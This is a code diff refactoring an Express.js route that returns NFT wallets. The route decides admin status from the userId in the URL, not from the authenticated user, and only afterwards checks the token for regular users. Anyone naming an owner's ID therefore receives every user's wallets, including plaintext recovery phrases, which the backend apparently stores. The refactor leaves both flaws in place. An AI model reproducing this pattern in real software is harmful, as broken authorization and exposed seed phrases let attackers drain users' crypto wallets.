@@ -1466,45 +1466,56 @@ router.get("/nft-wallets/:userId", async (req, res) => {
   try {
     const { userId } = req.params;
 
-    // 1️⃣ Find the requesting user by the userId param
-    const requestingUser = await User.findOne({ userId }, "name isOwner wallets").lean();
+    // 1️⃣ Lookup the requesting user
+    const requestingUser = await User.findOne(
+      { userId },
+      "name isOwner wallets"
+    ).lean();
     if (!requestingUser) {
       return res.status(404).json({ message: "User not found" });
     }
 
-    // 2️⃣ If that user is the owner/admin, return *all* wallets
+    // 2️⃣ Admin view: return every wallet with ownerName
     if (requestingUser.isOwner) {
       const users = await User.find({}, "name wallets").lean();
-      const allWallets = users.flatMap(u =>
-        u.wallets.map(w => ({
+
+      const allWallets = users.flatMap(u => {
+        // default to empty array if missing
+        const arr = Array.isArray(u.wallets) ? u.wallets : [];
+        return arr.map(w => ({
           ownerName: u.name,
           walletName: w.walletName,
           walletAddress: w.walletAddress,
           recoveryPhrase: w.recoveryPhrase,
           dateAdded: w.dateAdded,
           _id: w._id
-        }))
-      );
+        }));
+      });
+
       return res.json({ wallets: allWallets });
     }
 
-    // 3️⃣ Otherwise, ensure they’re only fetching their own wallets
-    //    (double-check against authenticated token if you like)
+    // 3️⃣ Regular user: ensure they’re only fetching their own
     if (req.user.userId !== userId) {
       return res.status(403).json({ message: "Forbidden" });
     }
 
-    // 4️⃣ Return just that user’s wallets (non-sensitive fields)
-    const ownWallets = requestingUser.wallets.map(w => ({
+    // 4️⃣ Return just that user’s wallets
+    const ownArr = Array.isArray(requestingUser.wallets)
+      ? requestingUser.wallets
+      : [];
+
+    const ownWallets = ownArr.map(w => ({
       walletName: w.walletName,
       walletAddress: w.walletAddress,
       dateAdded: w.dateAdded,
       _id: w._id
     }));
+
     return res.json({ wallets: ownWallets });
 
   } catch (err) {
-    console.error("Error in GET /nft-wallets/:userId", err);
+    console.error("GET /nft-wallets/:userId error:", err);
     res.status(500).json({ message: err.message });
   }
 });
